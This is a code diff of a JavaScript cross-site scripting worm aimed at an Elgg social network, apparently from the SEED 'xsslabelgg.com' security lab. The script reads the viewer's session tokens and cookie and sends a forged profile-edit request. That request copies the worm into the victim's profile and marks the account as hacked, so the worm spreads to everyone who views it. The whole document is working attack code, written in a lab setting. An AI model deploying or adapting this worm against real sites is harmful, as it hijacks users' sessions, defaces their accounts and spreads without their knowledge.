@@ -12,62 +12,27 @@ var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
     console.log('hemlo1');
     var namee = elgg.session.user.name;
 
-    var userid = elgg.page_owner.guid;
+    var userid = '&guid=' + elgg.page_owner.guid;
+    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
+	var token="&__elgg_token="+elgg.security.token.__elgg_token;
+	var description = '&description=' + wormCode;
+    var name = "&name=" + namee;
+    var brief = '&briefdescription=' + 'account hacking done';
+    var idd = '&guid=' + elgg.session.user.guid;
 
-    var data = new FormData();
-    console.log('hemlo2');
-    data.append('__elgg_token', elgg.security.token.__elgg_token );
-    data.append('__elgg_ts', elgg.security.token.__elgg_ts);
-
-    data.append('name', namee);
-    console.log('hemlo3');
-    //alert(jsCode);
-    data.append('description', wormCode);
-    data.append('accesslevel[description]', 1);
-
+    var data = ts + token + name + description + brief + idd;
     
-
-    data.append('briefdescription', '121212');
-    data.append('accesslevel[briefdescription]', 1);
-
-    data.append('location', 'You have been hacked');
-    data.append('accesslevel[location]', 1);
-
-    data.append('interests', 'You have been hacked');
-    data.append('accesslevel[interests]', 1);
-
-    data.append('skills', 'You have been hacked');
-    data.append('accesslevel[skills]', 1);
-
-    data.append('contactemail', 'hacked@gmail.com');
-    data.append('accesslevel[contactemail]', 1);
-
-    data.append('phone', 'You have been hacked');
-    data.append('accesslevel[phone]', 1);
-
-    data.append('mobile', 'You have been hacked');
-    data.append('accesslevel[mobile]', 1);
-
-    data.append('website', 'www.hacked.com');
-    data.append('accesslevel[website]', 1);
-
-    data.append('twitter', 'You have been hacked');
-    data.append('accesslevel[twitter]', 1);
-
-    data.append('guid', elgg.session.user.guid);
-
     if(elgg.session.user.guid != elgg.page_owner.guid)
     {
 		//Create and send Ajax request to modify profile
 		var Ajax=null;
-    Ajax=new XMLHttpRequest();
-    Ajax.open("POST",sendurl,true);
-    Ajax.setRequestHeader("Cookie",document.cookie);
-    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
-    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+	    Ajax=new XMLHttpRequest();
+	    Ajax.open("POST",sendurl,true);
+	    Ajax.setRequestHeader("Cookie",document.cookie);
+	    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
+	    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
-    Ajax.send(data);
-    console.log('success');
+    	Ajax.send(data);
 	}
 
 
